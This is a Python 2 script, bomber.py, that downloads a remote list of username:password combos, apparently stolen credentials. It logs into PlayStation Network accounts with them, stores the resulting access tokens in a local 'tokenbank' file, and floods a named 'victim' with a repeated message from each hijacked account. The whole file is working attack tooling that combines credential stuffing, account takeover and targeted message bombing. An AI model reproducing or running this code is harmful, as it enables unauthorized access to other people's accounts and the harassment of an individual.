import requests, json, random, time, sys, pickle
from psnlib import * 

## Config
delay  = 3 # Delay between messages (seconds)
comboList = "REDACTED_URL" # Userlist (page was a list of username/password combos)

debug = 0  # Use 1 or 0
## /Config

tokenbank = "tokenbank.p"

def log(msg):
    if debug:
        print msg

def getTokens():
    try:
        tokens = pickle.load(open(tokenbank, "rb"))
    except EOFError:
        tokens = {}

    return tokens

def removeToken(email):
    tokens = getTokens()

    try:
        del tokens[email]
    except KeyError:
        pass

    pickle.dump(tokens, open(tokenbank, "wb"))

def addToken(email, token):
    tokens = getTokens()
    tokens[email] = token

    pickle.dump(tokens, open(tokenbank, "wb"))

# Argument parsing
if len(sys.argv) > 3:
    victim = sys.argv[1]
    amount = int(sys.argv[2])
    message = " ".join(sys.argv[3:])
else:
    print "usage: bomber.py <victim> <amount> <message>"
    sys.exit()

# Main flow
try:
    users = requests.get(comboList, \
                         headers={"User-Agent" : "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0"}).text.strip().replace("\r", "").split("\n")

except:
    print "ERROR: Unable to get users list"
    sys.exit()

onlyonce = False

for user in users:
    email = user.split(":")[0]
    password = user.split(":")[1]

    accessToken = False

    tokens = getTokens()

    # Check if token exists
    if email in tokens:
        log("in file")
        accessToken = tokens[email]

    while True:

        # No access token, get one and store it.
        if not accessToken:
            log("no token")
            response = login(email, password)

            # Did it succeed?
            if not response or type(response) == bool:
                print errors["loginfailed"]
                continue

            accessToken = response["access_token"]

            # Add to tokenbank
            addToken(email, accessToken)
            log("got token")

        response = getMyInfos(accessToken)

        # Token is expired
        if "error" in response:
            removeToken(email)
            log("token expired")

        else:
            log("token worked")
            break # All succeeded :)

    region = response["region"]
    lang = response["language"]
    from_ = response["onlineId"]

    for key in psnURLS.keys():
        psnURLS[key] = psnURLS[key].replace("{{lang}}", lang).replace("{{region}}", region)

    # Sending messages
    for i in xrange(amount):
        result = sendMessage(accessToken, from_, victim, message)

        if "sentMessageId" in result:
            # print "Message #" + str(i + 1) + " sent."
            if onlyonce == False:
                print errors["messagesuccess"]
                onlyonce = True
        else:
            # print "Couldn't send message (Victim doesn't exist?) Exiting..."
            print errors["messagefailed"]
            sys.exit()

        time.sleep(delay)
